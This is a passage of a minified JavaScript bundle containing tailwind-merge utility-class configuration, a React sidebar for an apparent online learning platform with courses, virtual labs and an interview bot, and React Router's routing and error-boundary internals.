k-r-from":M()}],"mask-image-r-to-color":[{"mask-r-to":M()}],"mask-image-b-from-pos":[{"mask-b-from":se()}],"mask-image-b-to-pos":[{"mask-b-to":se()}],"mask-image-b-from-color":[{"mask-b-from":M()}],"mask-image-b-to-color":[{"mask-b-to":M()}],"mask-image-l-from-pos":[{"mask-l-from":se()}],"mask-image-l-to-pos":[{"mask-l-to":se()}],"mask-image-l-from-color":[{"mask-l-from":M()}],"mask-image-l-to-color":[{"mask-l-to":M()}],"mask-image-x-from-pos":[{"mask-x-from":se()}],"mask-image-x-to-pos":[{"mask-x-to":se()}],"mask-image-x-from-color":[{"mask-x-from":M()}],"mask-image-x-to-color":[{"mask-x-to":M()}],"mask-image-y-from-pos":[{"mask-y-from":se()}],"mask-image-y-to-pos":[{"mask-y-to":se()}],"mask-image-y-from-color":[{"mask-y-from":M()}],"mask-image-y-to-color":[{"mask-y-to":M()}],"mask-image-radial":[{"mask-radial":[he,ue]}],"mask-image-radial-from-pos":[{"mask-radial-from":se()}],"mask-image-radial-to-pos":[{"mask-radial-to":se()}],"mask-image-radial-from-color":[{"mask-radial-from":M()}],"mask-image-radial-to-color":[{"mask-radial-to":M()}],"mask-image-radial-shape":[{"mask-radial":["circle","ellipse"]}],"mask-image-radial-size":[{"mask-radial":[{closest:["side","corner"],farthest:["side","corner"]}]}],"mask-image-radial-pos":[{"mask-radial-at":U()}],"mask-image-conic-pos":[{"mask-conic":[_e]}],"mask-image-conic-from-pos":[{"mask-conic-from":se()}],"mask-image-conic-to-pos":[{"mask-conic-to":se()}],"mask-image-conic-from-color":[{"mask-conic-from":M()}],"mask-image-conic-to-color":[{"mask-conic-to":M()}],"mask-mode":[{mask:["alpha","luminance","match"]}],"mask-origin":[{"mask-origin":["border","padding","content","fill","stroke","view"]}],"mask-position":[{mask:W()}],"mask-repeat":[{mask:Q()}],"mask-size":[{mask:E()}],"mask-type":[{"mask-type":["alpha","luminance"]}],"mask-image":[{mask:["none",he,ue]}],filter:[{filter:["","none",he,ue]}],blur:[{blur:ve()}],brightness:[{brightness:[_e,he,ue]}],contrast:[{contrast:[_e,he,ue]}],"drop-shadow":[{"drop-shadow":["","none",j,uo,co]}],"drop-shadow-color":[{"drop-shadow":M()}],grayscale:[{grayscale:["",_e,he,ue]}],"hue-rotate":[{"hue-rotate":[_e,he,ue]}],invert:[{invert:["",_e,he,ue]}],saturate:[{saturate:[_e,he,ue]}],sepia:[{sepia:["",_e,he,ue]}],"backdrop-filter":[{"backdrop-filter":["","none",he,ue]}],"backdrop-blur":[{"backdrop-blur":ve()}],"backdrop-brightness":[{"backdrop-brightness":[_e,he,ue]}],"backdrop-contrast":[{"backdrop-contrast":[_e,he,ue]}],"backdrop-grayscale":[{"backdrop-grayscale":["",_e,he,ue]}],"backdrop-hue-rotate":[{"backdrop-hue-rotate":[_e,he,ue]}],"backdrop-invert":[{"backdrop-invert":["",_e,he,ue]}],"backdrop-opacity":[{"backdrop-opacity":[_e,he,ue]}],"backdrop-saturate":[{"backdrop-saturate":[_e,he,ue]}],"backdrop-sepia":[{"backdrop-sepia":["",_e,he,ue]}],"border-collapse":[{border:["collapse","separate"]}],"border-spacing":[{"border-spacing":O()}],"border-spacing-x":[{"border-spacing-x":O()}],"border-spacing-y":[{"border-spacing-y":O()}],"table-layout":[{table:["auto","fixed"]}],caption:[{caption:["top","bottom"]}],transition:[{transition:["","all","colors","opacity","shadow","transform","none",he,ue]}],"transition-behavior":[{transition:["normal","discrete"]}],duration:[{duration:[_e,"initial",he,ue]}],ease:[{ease:["linear","initial",T,he,ue]}],delay:[{delay:[_e,he,ue]}],animate:[{animate:["none",R,he,ue]}],backface:[{backface:["hidden","visible"]}],perspective:[{perspective:[k,he,ue]}],"perspective-origin":[{"perspective-origin":z()}],rotate:[{rotate:Ne()}],"rotate-x":[{"rotate-x":Ne()}],"rotate-y":[{"rotate-y":Ne()}],"rotate-z":[{"rotate-z":Ne()}],scale:[{scale:Le()}],"scale-x":[{"scale-x":Le()}],"scale-y":[{"scale-y":Le()}],"scale-z":[{"scale-z":Le()}],"scale-3d":["scale-3d"],skew:[{skew:kt()}],"skew-x":[{"skew-x":kt()}],"skew-y":[{"skew-y":kt()}],transform:[{transform:[he,ue,"","none","gpu","cpu"]}],"transform-origin":[{origin:z()}],"transform-style":[{transform:["3d","flat"]}],translate:[{translate:rt()}],"translate-x":[{"translate-x":rt()}],"translate-y":[{"translate-y":rt()}],"translate-z":[{"translate-z":rt()}],"translate-none":["translate-none"],accent:[{accent:M()}],appearance:[{appearance:["none","auto"]}],"caret-color":[{caret:M()}],"color-scheme":[{scheme:["normal","dark","light","light-dark","only-dark","only-light"]}],cursor:[{cursor:["auto","default","pointer","wait","text","move","help","not-allowed","none","context-menu","progress","cell","crosshair","vertical-text","alias","copy","no-drop","grab","grabbing","all-scroll","col-resize","row-resize","n-resize","e-resize","s-resize","w-resize","ne-resize","nw-resize","se-resize","sw-resize","ew-resize","ns-resize","nesw-resize","nwse-resize","zoom-in","zoom-out",he,ue]}],"field-sizing":[{"field-sizing":["fixed","content"]}],"pointer-events":[{"pointer-events":["auto","none"]}],resize:[{resize:["none","","y","x"]}],"scroll-behavior":[{scroll:["auto","smooth"]}],"scroll-m":[{"scroll-m":O()}],"scroll-mx":[{"scroll-mx":O()}],"scroll-my":[{"scroll-my":O()}],"scroll-ms":[{"scroll-ms":O()}],"scroll-me":[{"scroll-me":O()}],"scroll-mt":[{"scroll-mt":O()}],"scroll-mr":[{"scroll-mr":O()}],"scroll-mb":[{"scroll-mb":O()}],"scroll-ml":[{"scroll-ml":O()}],"scroll-p":[{"scroll-p":O()}],"scroll-px":[{"scroll-px":O()}],"scroll-py":[{"scroll-py":O()}],"scroll-ps":[{"scroll-ps":O()}],"scroll-pe":[{"scroll-pe":O()}],"scroll-pt":[{"scroll-pt":O()}],"scroll-pr":[{"scroll-pr":O()}],"scroll-pb":[{"scroll-pb":O()}],"scroll-pl":[{"scroll-pl":O()}],"snap-align":[{snap:["start","end","center","align-none"]}],"snap-stop":[{snap:["normal","always"]}],"snap-type":[{snap:["none","x","y","both"]}],"snap-strictness":[{snap:["mandatory","proximity"]}],touch:[{touch:["auto","none","manipulation"]}],"touch-x":[{"touch-pan":["x","left","right"]}],"touch-y":[{"touch-pan":["y","up","down"]}],"touch-pz":["touch-pinch-zoom"],select:[{select:["none","text","all","auto"]}],"will-change":[{"will-change":["auto","scroll","contents","transform",he,ue]}],fill:[{fill:["none",...M()]}],"stroke-w":[{stroke:[_e,Ca,Ms,Oc]}],stroke:[{stroke:["none",...M()]}],"forced-color-adjust":[{"forced-color-adjust":["auto","none"]}]},conflictingClassGroups:{overflow:["overflow-x","overflow-y"],overscroll:["overscroll-x","overscroll-y"],inset:["inset-x","inset-y","start","end","top","right","bottom","left"],"inset-x":["right","left"],"inset-y":["top","bottom"],flex:["basis","grow","shrink"],gap:["gap-x","gap-y"],p:["px","py","ps","pe","pt","pr","pb","pl"],px:["pr","pl"],py:["pt","pb"],m:["mx","my","ms","me","mt","mr","mb","ml"],mx:["mr","ml"],my:["mt","mb"],size:["w","h"],"font-size":["leading"],"fvn-normal":["fvn-ordinal","fvn-slashed-zero","fvn-figure","fvn-spacing","fvn-fraction"],"fvn-ordinal":["fvn-normal"],"fvn-slashed-zero":["fvn-normal"],"fvn-figure":["fvn-normal"],"fvn-spacing":["fvn-normal"],"fvn-fraction":["fvn-normal"],"line-clamp":["display","overflow"],rounded:["rounded-s","rounded-e","rounded-t","rounded-r","rounded-b","rounded-l","rounded-ss","rounded-se","rounded-ee","rounded-es","rounded-tl","rounded-tr","rounded-br","rounded-bl"],"rounded-s":["rounded-ss","rounded-es"],"rounded-e":["rounded-se","rounded-ee"],"rounded-t":["rounded-tl","rounded-tr"],"rounded-r":["rounded-tr","rounded-br"],"rounded-b":["rounded-br","rounded-bl"],"rounded-l":["rounded-tl","rounded-bl"],"border-spacing":["border-spacing-x","border-spacing-y"],"border-w":["border-w-x","border-w-y","border-w-s","border-w-e","border-w-t","border-w-r","border-w-b","border-w-l"],"border-w-x":["border-w-r","border-w-l"],"border-w-y":["border-w-t","border-w-b"],"border-color":["border-color-x","border-color-y","border-color-s","border-color-e","border-color-t","border-color-r","border-color-b","border-color-l"],"border-color-x":["border-color-r","border-color-l"],"border-color-y":["border-color-t","border-color-b"],translate:["translate-x","translate-y","translate-none"],"translate-none":["translate","translate-x","translate-y","translate-z"],"scroll-m":["scroll-mx","scroll-my","scroll-ms","scroll-me","scroll-mt","scroll-mr","scroll-mb","scroll-ml"],"scroll-mx":["scroll-mr","scroll-ml"],"scroll-my":["scroll-mt","scroll-mb"],"scroll-p":["scroll-px","scroll-py","scroll-ps","scroll-pe","scroll-pt","scroll-pr","scroll-pb","scroll-pl"],"scroll-px":["scroll-pr","scroll-pl"],"scroll-py":["scroll-pt","scroll-pb"],touch:["touch-x","touch-y","touch-pz"],"touch-x":["touch"],"touch-y":["touch"],"touch-pz":["touch"]},conflictingClassGroupModifiers:{"font-size":["leading"]},orderSensitiveModifiers:["*","**","after","backdrop","before","details-content","file","first-letter","first-line","marker","placeholder","selection"]}},aw=My(nw);function Ir(...a){return aw(gy(a))}const iw=({activeTab:a,onTabChange:n})=>{const{user:s,logout:i,isTeacher:o,isAdmin:c}=Ie(),d=[{id:"dashboard",label:"Dashboard",icon:Fd},{id:"courses",label:"Courses",icon:xr},{id:"labs",label:"Virtual Labs",icon:He},{id:"videos",label:"Video Library",icon:Cd},{id:"certificates",label:"Certificates",icon:tt},{id:"notes",label:"My Notes",icon:Mt},{id:"profile",label:"Profile",icon:zt},{id:"career",label:"Mission Board",icon:k0},{id:"interview",label:"Interview Bot",icon:nd},{id:"resume",label:"Resume",icon:Mt},{id:"assessment",label:"Assessment",icon:Qv}];return o(),c(),e.jsxs("div",{className:"w-72 bg-[#0A0F0A] border-r border-[#00FF88]/10 h-[calc(100vh-4rem)] flex flex-col sticky top-16",children:[e.jsx("div",{className:"p-4 flex-1 overflow-y-auto custom-scrollbar",children:e.jsx("div",{className:"space-y-2",children:d.map(m=>{const f=m.icon,x=a===m.id;return e.jsxs("button",{onClick:()=>n(m.id),className:Ir("w-full flex items-center space-x-3 px-4 py-3.5 rounded-xl transition-all duration-300 group relative overflow-hidden",x?"bg-gradient-to-r from-[#00FF88]/20 to-[#00FF88]/5 text-[#00FF88] shadow-[0_0_20px_rgba(0,255,136,0.15)] border border-[#00FF88]/20":"text-[#00B37A] hover:text-[#EAEAEA] hover:bg-[#00FF88]/5 border border-transparent hover:shadow-lg hover:shadow-[#00FF88]/5"),children:[e.jsx("div",{className:Ir("p-2 rounded-lg transition-all duration-300",x?"bg-[#00FF88]/10":"bg-[#00FF88]/5 group-hover:bg-[#00FF88]/10"),children:e.jsx(f,{className:Ir("h-5 w-5 transition-transform duration-300 group-hover:scale-110",x?"text-[#00FF88]":"text-[#00B37A] group-hover:text-[#EAEAEA]")})}),e.jsx("span",{className:"font-medium tracking-wide text-sm",children:m.label}),x&&e.jsx("div",{className:"absolute right-3 animate-fade-in",children:e.jsx(Yt,{className:"h-4 w-4 text-primary"})})]},m.id)})})}),e.jsxs("div",{className:"p-4 border-t border-[#00FF88]/10 bg-[#0A0F0A]/50 backdrop-blur-sm",children:[e.jsxs("div",{className:"mb-4 px-4 py-3 bg-gradient-to-br from-[#0A0F0A] to-[#000000] rounded-xl border border-[#00FF88]/10 shadow-inner",children:[e.jsx("p",{className:"text-xs font-medium text-[#00B37A] uppercase tracking-wider mb-2",children:"Quick Stats"}),e.jsxs("div",{className:"flex justify-between items-center",children:[e.jsxs("div",{children:[e.jsx("p",{className:"text-2xl font-bold text-[#EAEAEA]",children:s?.role==="student"?"Level 5":"Admin"}),e.jsx("p",{className:"text-xs text-[#00FF88]",children:s?.role==="student"?"Intermediate":"System Access"})]}),e.jsx("div",{className:"h-10 w-10 rounded-full bg-[#00FF88]/10 flex items-center justify-center border border-[#00FF88]/20",children:e.jsx(tt,{className:"h-5 w-5 text-[#00FF88]"})})]})]}),e.jsxs("button",{onClick:()=>n("pricing"),className:"w-full mb-3 bg-[#00FF88]/10 hover:bg-[#00FF88]/20 text-[#00FF88] text-xs font-bold py-2 px-3 rounded border border-[#00FF88]/20 transition-all uppercase tracking-wide flex items-center justify-center gap-2",children:[e.jsx(ze,{className:"h-3 w-3"}),"Upgrade Clearance"]}),e.jsxs("button",{onClick:i,className:"w-full flex items-center justify-center space-x-2 px-4 py-3 rounded-xl text-[#00B37A] hover:text-red-400 hover:bg-red-500/10 border border-transparent hover:border-red-500/20 transition-all duration-300 group",children:[e.jsx(Eo,{className:"h-5 w-5 group-hover:scale-110 transition-transform"}),e.jsx("span",{className:"font-medium",children:"Sign Out"})]})]})]})};var Im="popstate";function ow(a={}){function n(i,o){let{pathname:c,search:d,hash:m}=i.location;return ud("",{pathname:c,search:d,hash:m},o.state&&o.state.usr||null,o.state&&o.state.key||"default")}function s(i,o){return typeof o=="string"?o:qa(o)}return cw(n,s,null,a)}function qe(a,n){if(a===!1||a===null||typeof a>"u")throw new Error(n)}function Jt(a,n){if(!a){typeof console<"u"&&console.warn(n);try{throw new Error(n)}catch{}}}function lw(){return Math.random().toString(36).substring(2,10)}function Lm(a,n){return{usr:a.state,key:a.key,idx:n}}function ud(a,n,s=null,i){return{pathname:typeof a=="string"?a:a.pathname,search:"",hash:"",...typeof n=="string"?$n(n):n,state:s,key:n&&n.key||i||lw()}}function qa({pathname:a="/",search:n="",hash:s=""}){return n&&n!=="?"&&(a+=n.charAt(0)==="?"?n:"?"+n),s&&s!=="#"&&(a+=s.charAt(0)==="#"?s:"#"+s),a}function $n(a){let n={};if(a){let s=a.indexOf("#");s>=0&&(n.hash=a.substring(s),a=a.substring(0,s));let i=a.indexOf("?");i>=0&&(n.search=a.substring(i),a=a.substring(0,i)),a&&(n.pathname=a)}return n}function cw(a,n,s,i={}){let{window:o=document.defaultView,v5Compat:c=!1}=i,d=o.history,m="POP",f=null,x=p();x==null&&(x=0,d.replaceState({...d.state,idx:x},""));function p(){return(d.state||{idx:null}).idx}function b(){m="POP";let F=p(),T=F==null?null:F-x;x=F,f&&f({action:m,location:k.location,delta:T})}function w(F,T){m="PUSH";let R=ud(k.location,F,T);x=p()+1;let S=Lm(R,x),U=k.createHref(R);try{d.pushState(S,"",U)}catch(z){if(z instanceof DOMException&&z.name==="DataCloneError")throw z;o.location.assign(U)}c&&f&&f({action:m,location:k.location,delta:1})}function j(F,T){m="REPLACE";let R=ud(k.location,F,T);x=p();let S=Lm(R,x),U=k.createHref(R);d.replaceState(S,"",U),c&&f&&f({action:m,location:k.location,delta:0})}function N(F){return dw(F)}let k={get action(){return m},get location(){return a(o,d)},listen(F){if(f)throw new Error("A history only accepts one active listener");return o.addEventListener(Im,b),f=F,()=>{o.removeEventListener(Im,b),f=null}},createHref(F){return n(o,F)},createURL:N,encodeLocation(F){let T=N(F);return{pathname:T.pathname,search:T.search,hash:T.hash}},push:w,replace:j,go(F){return d.go(F)}};return k}function dw(a,n=!1){let s="http://localhost";typeof window<"u"&&(s=window.location.origin!=="null"?window.location.origin:window.location.href),qe(s,"No window.location.(origin|href) available to create URL");let i=typeof a=="string"?a:qa(a);return i=i.replace(/ $/,"%20"),!n&&i.startsWith("//")&&(i=s+i),new URL(i,s)}function W0(a,n,s="/"){return uw(a,n,s,!1)}function uw(a,n,s,i){let o=typeof n=="string"?$n(n):n,c=Mr(o.pathname||"/",s);if(c==null)return null;let d=V0(a);hw(d);let m=null;for(let f=0;m==null&&f<d.length;++f){let x=Nw(c);m=ww(d[f],x,i)}return m}function V0(a,n=[],s=[],i="",o=!1){let c=(d,m,f=o,x)=>{let p={relativePath:x===void 0?d.path||"":x,caseSensitive:d.caseSensitive===!0,childrenIndex:m,route:d};if(p.relativePath.startsWith("/")){if(!p.relativePath.startsWith(i)&&f)return;qe(p.relativePath.startsWith(i),`Absolute route path "${p.relativePath}" nested under path "${i}" is not valid. An absolute child route path must start with the combined path of all its parent routes.`),p.relativePath=p.relativePath.slice(i.length)}let b=Lr([i,p.relativePath]),w=s.concat(p);d.children&&d.children.length>0&&(qe(d.index!==!0,`Index routes must not have child routes. Please remove all child routes from route path "${b}".`),V0(d.children,n,w,b,f)),!(d.path==null&&!d.index)&&n.push({path:b,score:vw(b,d.index),routesMeta:w})};return a.forEach((d,m)=>{if(d.path===""||!d.path?.includes("?"))c(d,m);else for(let f of H0(d.path))c(d,m,!0,f)}),n}function H0(a){let n=a.split("/");if(n.length===0)return[];let[s,...i]=n,o=s.endsWith("?"),c=s.replace(/\?$/,"");if(i.length===0)return o?[c,""]:[c];let d=H0(i.join("/")),m=[];return m.push(...d.map(f=>f===""?c:[c,f].join("/"))),o&&m.push(...d),m.map(f=>a.startsWith("/")&&f===""?"/":f)}function hw(a){a.sort((n,s)=>n.score!==s.score?s.score-n.score:yw(n.routesMeta.map(i=>i.childrenIndex),s.routesMeta.map(i=>i.childrenIndex)))}var fw=/^:[\w-]+$/,mw=3,pw=2,xw=1,gw=10,bw=-2,Om=a=>a==="*";function vw(a,n){let s=a.split("/"),i=s.length;return s.some(Om)&&(i+=bw),n&&(i+=pw),s.filter(o=>!Om(o)).reduce((o,c)=>o+(fw.test(c)?mw:c===""?xw:gw),i)}function yw(a,n){return a.length===n.length&&a.slice(0,-1).every((i,o)=>i===n[o])?a[a.length-1]-n[n.length-1]:0}function ww(a,n,s=!1){let{routesMeta:i}=a,o={},c="/",d=[];for(let m=0;m<i.length;++m){let f=i[m],x=m===i.length-1,p=c==="/"?n:n.slice(c.length)||"/",b=Fo({path:f.relativePath,caseSensitive:f.caseSensitive,end:x},p),w=f.route;if(!b&&x&&s&&!i[i.length-1].route.index&&(b=Fo({path:f.relativePath,caseSensitive:f.caseSensitive,end:!1},p)),!b)return null;Object.assign(o,b.params),d.push({params:o,pathname:Lr([c,b.pathname]),pathnameBase:Sw(Lr([c,b.pathnameBase])),route:w}),b.pathnameBase!=="/"&&(c=Lr([c,b.pathnameBase]))}return d}function Fo(a,n){typeof a=="string"&&(a={path:a,caseSensitive:!1,end:!0});let[s,i]=jw(a.path,a.caseSensitive,a.end),o=n.match(s);if(!o)return null;let c=o[0],d=c.replace(/(.)\/+$/,"$1"),m=o.slice(1);return{params:i.reduce((x,{paramName:p,isOptional:b},w)=>{if(p==="*"){let N=m[w]||"";d=c.slice(0,c.length-N.length).replace(/(.)\/+$/,"$1")}const j=m[w];return b&&!j?x[p]=void 0:x[p]=(j||"").replace(/%2F/g,"/"),x},{}),pathname:c,pathnameBase:d,pattern:a}}function jw(a,n=!1,s=!0){Jt(a==="*"||!a.endsWith("*")||a.endsWith("/*"),`Route path "${a}" will be treated as if it were "${a.replace(/\*$/,"/*")}" because the \`*\` character must always follow a \`/\` in the pattern. To get rid of this warning, please change the route path to "${a.replace(/\*$/,"/*")}".`);let i=[],o="^"+a.replace(/\/*\*?$/,"").replace(/^\/*/,"/").replace(/[\\.*+^${}|()[\]]/g,"\\$&").replace(/\/:([\w-]+)(\?)?/g,(d,m,f)=>(i.push({paramName:m,isOptional:f!=null}),f?"/?([^\\/]+)?":"/([^\\/]+)")).replace(/\/([\w-]+)\?(\/|$)/g,"(/$1)?$2");return a.endsWith("*")?(i.push({paramName:"*"}),o+=a==="*"||a==="/*"?"(.*)$":"(?:\\/(.+)|\\/*)$"):s?o+="\\/*$":a!==""&&a!=="/"&&(o+="(?:(?=\\/|$))"),[new RegExp(o,n?void 0:"i"),i]}function Nw(a){try{return a.split("/").map(n=>decodeURIComponent(n).replace(/\//g,"%2F")).join("/")}catch(n){return Jt(!1,`The URL path "${a}" could not be decoded because it is a malformed URL segment. This is probably due to a bad percent encoding (${n}).`),a}}function Mr(a,n){if(n==="/")return a;if(!a.toLowerCase().startsWith(n.toLowerCase()))return null;let s=n.endsWith("/")?n.length-1:n.length,i=a.charAt(s);return i&&i!=="/"?null:a.slice(s)||"/"}var G0=/^(?:[a-z][a-z0-9+.-]*:|\/\/)/i,kw=a=>G0.test(a);function Fw(a,n="/"){let{pathname:s,search:i="",hash:o=""}=typeof a=="string"?$n(a):a,c;if(s)if(kw(s))c=s;else{if(s.includes("//")){let d=s;s=s.replace(/\/\/+/g,"/"),Jt(!1,`Pathnames cannot have embedded double slashes - normalizing ${d} -> ${s}`)}s.startsWith("/")?c=Dm(s.substring(1),"/"):c=Dm(s,n)}else c=n;return{pathname:c,search:Aw(i),hash:Ew(o)}}function Dm(a,n){let s=n.replace(/\/+$/,"").split("/");return a.split("/").forEach(o=>{o===".."?s.length>1&&s.pop():o!=="."&&s.push(o)}),s.length>1?s.join("/"):"/"}function Dc(a,n,s,i){return`Cannot include a '${a}' character in a manually specified \`to.${n}\` field [${JSON.stringify(i)}].  Please separate it out to the \`to.${s}\` field. Alternatively you may provide the full path as a string in <Link to="..."> and the router will parse it for you.`}function _w(a){return a.filter((n,s)=>s===0||n.route.path&&n.route.path.length>0)}function Rd(a){let n=_w(a);return n.map((s,i)=>i===n.length-1?s.pathname:s.pathnameBase)}function Id(a,n,s,i=!1){let o;typeof a=="string"?o=$n(a):(o={...a},qe(!o.pathname||!o.pathname.includes("?"),Dc("?","pathname","search",o)),qe(!o.pathname||!o.pathname.includes("#"),Dc("#","pathname","hash",o)),qe(!o.search||!o.search.includes("#"),Dc("#","search","hash",o)));let c=a===""||o.pathname==="",d=c?"/":o.pathname,m;if(d==null)m=s;else{let b=n.length-1;if(!i&&d.startsWith("..")){let w=d.split("/");for(;w[0]==="..";)w.shift(),b-=1;o.pathname=w.join("/")}m=b>=0?n[b]:"/"}let f=Fw(o,m),x=d&&d!=="/"&&d.endsWith("/"),p=(c||d===".")&&s.endsWith("/");return!f.pathname.endsWith("/")&&(x||p)&&(f.pathname+="/"),f}var Lr=a=>a.join("/").replace(/\/\/+/g,"/"),Sw=a=>a.replace(/\/+$/,"").replace(/^\/*/,"/"),Aw=a=>!a||a==="?"?"":a.startsWith("?")?a:"?"+a,Ew=a=>!a||a==="#"?"":a.startsWith("#")?a:"#"+a,Cw=class{constructor(a,n,s,i=!1){this.status=a,this.statusText=n||"",this.internal=i,s instanceof Error?(this.data=s.toString(),this.error=s):this.data=s}};function Tw(a){return a!=null&&typeof a.status=="number"&&typeof a.statusText=="string"&&typeof a.internal=="boolean"&&"data"in a}function Pw(a){return a.map(n=>n.route.path).filter(Boolean).join("/").replace(/\/\/*/g,"/")||"/"}var Q0=typeof window<"u"&&typeof window.document<"u"&&typeof window.document.createElement<"u";function K0(a,n){let s=a;if(typeof s!="string"||!G0.test(s))return{absoluteURL:void 0,isExternal:!1,to:s};let i=s,o=!1;if(Q0)try{let c=new URL(window.location.href),d=s.startsWith("//")?new URL(c.protocol+s):new URL(s),m=Mr(d.pathname,n);d.origin===c.origin&&m!=null?s=m+d.search+d.hash:o=!0}catch{Jt(!1,`<Link to="${s}"> contains an invalid URL which will probably break when clicked - please update to a valid URL path.`)}return{absoluteURL:i,isExternal:o,to:s}}Object.getOwnPropertyNames(Object.prototype).sort().join("\0");var Y0=["POST","PUT","PATCH","DELETE"];new Set(Y0);var Rw=["GET",...Y0];new Set(Rw);var Bn=v.createContext(null);Bn.displayName="DataRouter";var To=v.createContext(null);To.displayName="DataRouterState";var Iw=v.createContext(!1),J0=v.createContext({isTransitioning:!1});J0.displayName="ViewTransition";var Lw=v.createContext(new Map);Lw.displayName="Fetchers";var Ow=v.createContext(null);Ow.displayName="Await";var qt=v.createContext(null);qt.displayName="Navigation";var Ha=v.createContext(null);Ha.displayName="Location";var gr=v.createContext({outlet:null,matches:[],isDataRoute:!1});gr.displayName="Route";var Ld=v.createContext(null);Ld.displayName="RouteError";var X0="REACT_ROUTER_ERROR",Dw="REDIRECT",Mw="ROUTE_ERROR_RESPONSE";function $w(a){if(a.startsWith(`${X0}:${Dw}:{`))try{let n=JSON.parse(a.slice(28));if(typeof n=="object"&&n&&typeof n.status=="number"&&typeof n.statusText=="string"&&typeof n.location=="string"&&typeof n.reloadDocument=="boolean"&&typeof n.replace=="boolean")return n}catch{}}function Bw(a){if(a.startsWith(`${X0}:${Mw}:{`))try{let n=JSON.parse(a.slice(40));if(typeof n=="object"&&n&&typeof n.status=="number"&&typeof n.statusText=="string")return new Cw(n.status,n.statusText,n.data)}catch{}}function Uw(a,{relative:n}={}){qe(Un(),"useHref() may be used only in the context of a <Router> component.");let{basename:s,navigator:i}=v.useContext(qt),{hash:o,pathname:c,search:d}=Ga(a,{relative:n}),m=c;return s!=="/"&&(m=c==="/"?s:Lr([s,c])),i.createHref({pathname:m,search:d,hash:o})}function Un(){return v.useContext(Ha)!=null}function ws(){return qe(Un(),"useLocation() may be used only in the context of a <Router> component."),v.useContext(Ha).location}var Z0="You should call navigate() in a React.useEffect(), not when your component is first rendered.";function ep(a){v.useContext(qt).static||v.useLayoutEffect(a)}function zn(){let{isDataRoute:a}=v.useContext(gr);return a?e1():zw()}function zw(){qe(Un(),"useNavigate() may be used only in the context of a <Router> component.");let a=v.useContext(Bn),{basename:n,navigator:s}=v.useContext(qt),{matches:i}=v.useContext(gr),{pathname:o}=ws(),c=JSON.stringify(Rd(i)),d=v.useRef(!1);return ep(()=>{d.current=!0}),v.useCallback((f,x={})=>{if(Jt(d.current,Z0),!d.current)return;if(typeof f=="number"){s.go(f);return}let p=Id(f,JSON.parse(c),o,x.relative==="path");a==null&&n!=="/"&&(p.pathname=p.pathname==="/"?n:Lr([n,p.pathname])),(x.replace?s.replace:s.push)(p,x.state,x)},[n,s,c,o,a])}v.createContext(null);function Ga(a,{relative:n}={}){let{matches:s}=v.useContext(gr),{pathname:i}=ws(),o=JSON.stringify(Rd(s));return v.useMemo(()=>Id(a,JSON.parse(o),i,n==="path"),[a,o,i,n])}function qw(a,n){return tp(a,n)}function tp(a,n,s,i,o){qe(Un(),"useRoutes() may be used only in the context of a <Router> component.");let{navigator:c}=v.useContext(qt),{matches:d}=v.useContext(gr),m=d[d.length-1],f=m?m.params:{},x=m?m.pathname:"/",p=m?m.pathnameBase:"/",b=m&&m.route;{let R=b&&b.path||"";sp(x,!b||R.endsWith("*")||R.endsWith("*?"),`You rendered descendant <Routes> (or called \`useRoutes()\`) at "${x}" (under <Route path="${R}">) but the parent route path has no trailing "*". This means if you navigate deeper, the parent won't match anymore and therefore the child routes will never render.

Please change the parent <Route path="${R}"> to <Route path="${R==="/"?"*":`${R}/*`}">.`)}let w=ws(),j;if(n){let R=typeof n=="string"?$n(n):n;qe(p==="/"||R.pathname?.startsWith(p),`When overriding the location using \`<Routes location>\` or \`useRoutes(routes, location)\`, the location pathname must begin with the portion of the URL pathname that was matched by all parent routes. The current pathname base is "${p}" but pathname "${R.pathname}" was given in the \`location\` prop.`),j=R}else j=w;let N=j.pathname||"/",k=N;if(p!=="/"){let R=p.replace(/^\//,"").split("/");k="/"+N.replace(/^\//,"").split("/").slice(R.length).join("/")}let F=W0(a,{pathname:k});Jt(b||F!=null,`No routes matched location "${j.pathname}${j.search}${j.hash}" `),Jt(F==null||F[F.length-1].route.element!==void 0||F[F.length-1].route.Component!==void 0||F[F.length-1].route.lazy!==void 0,`Matched leaf route at location "${j.pathname}${j.search}${j.hash}" does not have an element or Component. This means it will render an <Outlet /> with a null value by default resulting in an "empty" page.`);let T=Qw(F&&F.map(R=>Object.assign({},R,{params:Object.assign({},f,R.params),pathname:Lr([p,c.encodeLocation?c.encodeLocation(R.pathname.replace(/\?/g,"%3F").replace(/#/g,"%23")).pathname:R.pathname]),pathnameBase:R.pathnameBase==="/"?p:Lr([p,c.encodeLocation?c.encodeLocation(R.pathnameBase.replace(/\?/g,"%3F").replace(/#/g,"%23")).pathname:R.pathnameBase])})),d,s,i,o);return n&&T?v.createElement(Ha.Provider,{value:{location:{pathname:"/",search:"",hash:"",state:null,key:"default",...j},navigationType:"POP"}},T):T}function Ww(){let a=Zw(),n=Tw(a)?`${a.status} ${a.statusText}`:a instanceof Error?a.message:JSON.stringify(a),s=a instanceof Error?a.stack:null,i="rgba(200,200,200, 0.5)",o={padding:"0.5rem",backgroundColor:i},c={padding:"2px 4px",backgroundColor:i},d=null;return console.error("Error handled by React Router default ErrorBoundary:",a),d=v.createElement(v.Fragment,null,v.createElement("p",null," Hey developer "),v.createElement("p",null,"You can provide a way better UX than this when your app throws errors by providing your own ",v.createElement("code",{style:c},"ErrorBoundary")," or"," ",v.createElement("code",{style:c},"errorElement")," prop on your route.")),v.createElement(v.Fragment,null,v.createElement("h2",null,"Unexpected Application Error!"),v.createElement("h3",{style:{fontStyle:"italic"}},n),s?v.createElement("pre",{style:o},s):null,d)}var Vw=v.createElement(Ww,null),rp=class extends v.Component{constructor(a){super(a),this.state={location:a.location,revalidation:a.revalidation,error:a.error}}static getDerivedStateFromError(a){return{error:a}}static getDerivedStateFromProps(a,n){return n.location!==a.location||n.revalidation!=="idle"&&a.revalidation==="idle"?{error:a.error,location:a.location,revalidation:a.revalidation}:{error:a.error!==void 0?a.error:n.error,location:n.location,revalidation:a.revalidation||n.revalidation}}componentDidCatch(a,n){this.props.onError?this.props.onError(a,n):console.error("React Router caught the following error during render",a)}render(){let a=this.state.error;if(this.context&&typeof a=="object"&&a&&"digest"in a&&typeof a.digest=="string"){const s=Bw(a.digest);s&&(a=s)}let n=a!==void 0?v.createElement(gr.Provider,{value:this.props.routeContext},v.createElement(Ld.Provider,{value:a,children:this.props.component})):this.props.children;return this.context?v.createElement(Hw,{error:a},n):n}};rp.contextType=Iw;var Mc=new WeakMap;function Hw({children:a,error:n}){let{basename:s}=v.useContext(qt);if(typeof n=="object"&&n&&"digest"in n&&typeof n.digest=="string"){let i=$w(n.digest);if(i){let o=Mc.get(n);if(o)throw o;let 